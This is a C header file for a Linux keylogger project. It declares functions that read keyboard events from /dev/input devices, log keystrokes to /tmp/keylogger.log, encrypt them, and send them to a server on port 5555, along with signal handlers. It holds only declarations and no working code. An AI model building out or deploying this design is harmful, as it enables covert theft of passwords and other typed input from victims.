
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <errno.h>
#include <strings.h>
#include <sys/select.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdbool.h>

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

// logger.c
#define BUFFER_SIZE 32
#define NB_KEYCODES 84
#define NB_EVENTS   512

#define EV_KEY_PRESSED 1
#define EV_KEY_RELEASE 0
void log_keys(int *, int, int);

// socket.c
#define PORT ("5555")

int connect_to_srv(char const *, int);

// get_keyboard.c
#define DIR_PATH    ("/dev/input/by-path/")
#define LOG_PATH    ("/tmp/keylogger.log")

int setup_log(void);
int *get_keyboard_paths(int);

// random_functions.c
char *encrypt(char *);
char *append(char *, char *);
void refresh_set(fd_set *, int *);
bool check_if_on_shift(bool, struct input_event);
void sigchild_handler(int);
void sigtrap_handler(int);
void check_pid_status(pid_t);

#endif /* KEYLOGGER_H */
